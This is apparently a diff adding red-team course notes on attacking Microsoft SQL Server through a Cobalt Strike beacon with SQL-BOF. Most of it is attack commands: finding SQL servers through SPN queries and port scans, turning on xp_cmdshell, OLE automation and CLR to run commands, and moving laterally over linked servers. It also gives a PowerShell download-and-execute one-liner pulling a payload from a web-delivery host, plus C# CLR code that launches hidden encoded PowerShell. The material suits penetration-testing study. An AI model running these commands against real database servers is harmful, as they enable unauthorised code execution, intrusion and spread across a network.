@@ -1,0 +1,91 @@
+MSSQL is microsoft's proprietary relational database management system
+
+tools to interact with MSSQL:
+    https://github.com/NetSPI/PowerUpSQL, https://github.com/skahwah/SQLRecon, https://github.com/Tw1sm/SQL-BOF, https://github.com/microsoft/go-sqlcmd, https://www.heidisql.com/, https://learn.microsoft.com/en-us/ssms/download-sql-server-management-studio-ssms
+this module focuses on SQL-BOF
+
+enumeration:
+    query for SPNs that support kerberos auth
+        beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
+            NOTE: this will return the hostname of the SQL servers and the service accounts used to run them
+    portscan for ports known to host MSSQL
+        beacon> portscan 10.10.120.0/23 1433 arp 1024
+    if SQLBrower service (port 1434) is open we can query for info
+        beacon> sql-1434udp 10.10.120.20
+    with the public role, we can query directly
+        beacon> sql-info lon-db-1
+            NOTE: this will return server information
+        beacon> sql-whoami lon-db-1
+            NOTE: this will return our role(s) and permissions
+        beacon> sql-query lon-db-1 "SELECT @@SERVERNAME"
+            NOTE: sql-query allows us to directly query the service
+    SQL-BOF commands:
+        sql-databases: lists available databases
+        sql-tables: lists tables in given database
+        sql-columns: lists columns in given table
+        sql-search: search columns based on keyword(s)
+
+code execution via MSSQL (requires local admin on the SQL server or sysadmin role):
+    xp_cmdshell (EXEC xp_cmdshell '<command>';):
+        the only execution technique that can return output
+        check if enabled:
+            beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
+                NOTE: 0 means disabled
+        enable it:
+            beacon> sql-enablexp lon-db-1
+        interact with it:
+            beacon> sql-xpcmd lon-db-1 "hostname && whoami"
+        disable it:
+            beacon> sql-disablexp lon-db-1
+    object linking and embeding (OLE automation):
+        technology that allows one application to link objects to another application
+        we can interact with specific COM objects to run shell commands/spawn process/etc.
+        check if enabled:
+            beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
+        enable it:
+            beacon> sql-enableole lon-db-1
+        interact with it (note there will be no output):
+            beacon> sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"
+        disable it:
+            beacon> sql-disableole lon-db-1
+    sql common language runtime (CLR):
+        feature which allows stored procedures to be written in any .NET language (c#) and stored with the database
+        check if enabled:
+            beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
+        enable it:
+            beacon> sql-enableclr lon-db-1
+        load and execute assembly:
+            beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure
+        disable it:
+            beacon> sql-disableclr lon-db-1
+
+privilege escalation via MSSQL:
+    we can enumerate linked servers for lateral movement
+    enumerate linked servers:
+        beacon> sql-links lon-db-1
+    query the linked server:
+        beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
+    enumerate user permissions on linked server:
+        beacon> sql-whoami lon-db-1 "" lon-db-2
+
+
+example one-liners:
+    host a payload via cobalt's scripted web delivery (Attacks > Scripted Web Delivery) and grab it via reverse port forward:
+        PS C:\Users\Attacker> $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
+        PS C:\Users\Attacker> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+
+example C# code for CLR:
+    public partial class StoredProcedures
+    {
+        [SqlProcedure]
+        public static void MyProcedure()
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                Arguments = "-w hidden -nop -enc ..."
+            };
+            
+            Process.Start(psi);
+        }
+    }
